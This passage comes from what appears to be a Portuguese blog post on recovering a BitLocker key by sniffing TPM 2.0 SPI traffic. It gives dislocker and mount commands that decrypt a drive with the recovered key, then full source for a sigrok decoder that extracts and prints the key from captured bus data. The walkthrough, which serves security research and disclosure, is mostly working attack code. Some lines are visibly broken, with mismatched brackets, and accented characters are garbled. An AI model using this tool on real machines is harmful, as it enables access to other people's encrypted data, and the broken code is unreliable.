<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"66D96600C7..."</span> | xxd <span class="nt">-p</span> <span class="nt">-r</span> <span class="o">&gt;</span> vmk.key
</code></pre></div></div>

<p>Em seguida, podemos utilizar o dislocker para criar um n√≥ de dispositivo com o dispositivo em texto simples, usando a parti√ß√£o n em sdx:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sdxn <span class="nt">--</span> ./mydisk
</code></pre></div></div>

<p>Por exemplo, se a parti√ß√£o criptografada estiver em /dev/sda3, pode-se utilizar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sda3 <span class="nt">--</span> ./mydisk
</code></pre></div></div>

<p>Ser√° criado um arquivo dislocker dentro da pasta ./mydisk, que representa o dispositivo e pode ser montado como uma parti√ß√£o normal.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount <span class="nt">-o</span> remove_hiberfile ./mydisk/dislocker-file /media/disk
</code></pre></div></div>

<p>Agora, √© poss√≠vel acessar os dados descriptografados na pasta /media/disk.</p>

<h3 id="todas-refer√™ncias-consolidadas">Todas refer√™ncias consolidadas</h3>

<p>Aqui est√£o todas as refer√™ncias consolidadas para que possam checar elas.</p>

<ul>
  <li>
    <p>TPM 2.0 Specification - <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>
  </li>
  <li>
    <p>F-Secure - Sniff, there leaks - <a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>
  </li>
  <li>
    <p>DolosGroup - From Stolen Laptop to Inside the company network - <a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>
  </li>
</ul>

<h1 id="arquivos">Arquivos</h1>

<h3 id="__init__py"><code class="language-plaintext highlighter-rouge">__init__.py</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
##
</span>
<span class="kn">from</span> <span class="n">.pd</span> <span class="kn">import</span> <span class="n">Decoder</span>
</code></pre></div></div>

<h3 id="pdpy"><code class="language-plaintext highlighter-rouge">pd.py</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
##
</span>
<span class="kn">import</span> <span class="n">sigrokdecode</span> <span class="k">as</span> <span class="n">srd</span>
<span class="kn">import</span> <span class="n">binascii</span><span class="p">,</span> <span class="n">re</span>
<span class="kn">from</span> <span class="n">enum</span> <span class="kn">import</span> <span class="n">Enum</span>

<span class="n">OPERATION_MASK</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">SIZE_MASK</span> <span class="o">=</span> <span class="mh">0x3f</span>
<span class="n">WAIT_MASK</span> <span class="o">=</span> <span class="mh">0x01</span>

<span class="c1"># Registers at https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf
# Page 63 (pdf 71) - Table 17
</span>
<span class="n">tpmRegisters</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0xD40000</span><span class="p">:</span> <span class="sh">"</span><span class="s">TPM_ACCESS_0</span><span class="sh">"</span><span class="p">,</span>
    <span class="mh">0xD4000C</span><span class="p">:</span> <span class="sh">"</span><span class="s">TPM_INT_VECTOR_0</span><span class="sh">"</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40008</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INT_ENABLE_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40010</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INT_STATUS_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40014</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INTF_CAPABILITY_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40018</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_STS_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40024</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_DATA_FIFO_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40030</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INTERFACE_ID_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40080</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_XDATA_FIFO_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40F00</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_DID_VID_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">{:08X} = {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>

<span class="k">class</span> <span class="nc">State</span><span class="p">(</span><span class="n">Enum</span><span class="p">):</span>
    <span class="n">READING_OP</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">READING_ARG</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="n">WAITING</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="n">TRANSFER</span> <span class="o">=</span> <span class="mi">4</span>

<span class="k">class</span> <span class="nc">Decoder</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">Decoder</span><span class="p">):</span>
    <span class="n">api_version</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="sh">'</span><span class="s">tpm20</span><span class="sh">'</span>
    <span class="n">name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">TPM2.0</span><span class="sh">'</span>
    <span class="n">longname</span> <span class="o">=</span> <span class="sh">'</span><span class="s">TPM 2.0</span><span class="sh">'</span>
    <span class="n">desc</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A TPM 2.0 Protocol Decoder</span><span class="sh">'</span>
    <span class="n">license</span> <span class="o">=</span> <span class="sh">'</span><span class="s">gplv2+</span><span class="sh">'</span>
    <span class="n">inputs</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">spi</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">outputs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">tags</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">SPI</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">TPM</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>
    <span class="n">annotations</span> <span class="o">=</span> <span class="p">(</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">text</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Text</span><span class="sh">'</span><span class="p">),</span>                   <span class="c1"># 0
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">warning</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Warning</span><span class="sh">'</span><span class="p">),</span>             <span class="c1"># 1
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">data-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Data write</span><span class="sh">'</span><span class="p">),</span>       <span class="c1"># 2
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">data-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Data read</span><span class="sh">'</span><span class="p">),</span>         <span class="c1"># 3
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">fifo-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO write</span><span class="sh">'</span><span class="p">),</span>       <span class="c1"># 4
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">fifo-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO read</span><span class="sh">'</span><span class="p">),</span>         <span class="c1"># 5
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">bitlocker-key</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Bitlocker Key</span><span class="sh">'</span><span class="p">),</span> <span class="c1"># 6
</span>    <span class="p">)</span>
    <span class="n">annotation_rows</span> <span class="o">=</span> <span class="p">(</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Read</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Write</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-fifo-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO Read</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-fifo-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO Write</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-bitlocker-key</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Bitlocker Key</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">)),</span>
    <span class="p">)</span>
    <span class="n">binary</span> <span class="o">=</span> <span class="p">(</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">packet-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Packet read</span><span class="sh">'</span><span class="p">),</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">packet-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Packet write</span><span class="sh">'</span><span class="p">),</span>
    <span class="p">)</span>
    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">reset</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">reset</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>

    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_ANN</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_python</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_PYTHON</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_binary</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_BINARY</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">DATA</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">_</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span> <span class="o">=</span> <span class="n">data</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">putdata</span><span class="p">(</span><span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">report_transaction</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="nf">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">ascii</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s">{}: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">tpmRegisters</span><span class="p">[</span><span class="n">addr</span><span class="p">],</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s">RESERVED({:06X}): {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">3</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">]</span> <span class="p">])</span>

    <span class="k">def</span> <span class="nf">report_fifo</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">"</span><span class="s">{:02X}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">5</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">4</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">report_bitlocker_key</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="p">[</span><span class="n">key</span><span class="p">))</span>

    <span class="n">opIsRead</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">numBytes</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">transactionStart</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">transactionEnd</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">putdata</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">OPERATION_MASK</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">7</span>    <span class="c1"># 1 = read, 0 = write
</span>            <span class="n">self</span><span class="p">.</span><span class="n">numBytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">SIZE_MASK</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>          <span class="c1"># Minimum transfer = 1 byte
</span>            <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span>
            <span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span> <span class="o">=</span> <span class="n">ss</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">mosi</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="c1"># Wait state
</span>                    <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Wait finished
</span>                <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Read from device
</span>                <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">miso</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>   <span class="c1"># Read from controller
</span>                <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">mosi</span><span class="p">)</span>
            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span> <span class="o">==</span> <span class="n">self</span><span class="p">.</span><span class="n">numBytes</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span> <span class="o">=</span> <span class="n">es</span>
                <span class="c1">#print("Transaction: ", self.bytesRead)
</span>                <span class="n">self</span><span class="p">.</span><span class="nf">report_transaction</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span> <span class="ow">and</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">addr</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">TPM_DATA_FIFO_0</span><span class="sh">"</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="nf">putfifo</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
                <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="nf">endfifo</span><span class="p">()</span>

                <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>

    <span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="c1"># 0 = Write, 1 = Read
</span>    <span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">fifoStart</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">fifoEnd</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">endfifo</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="c1"># No FIFO
</span>        <span class="n">self</span><span class="p">.</span><span class="nf">report_fifo</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">)</span>

        <span class="n">data</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">"</span><span class="s">{:02X}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">])</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Bitlocker Key: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">report_bitlocker_key</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>

    <span class="k">def</span> <span class="nf">putfifo</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
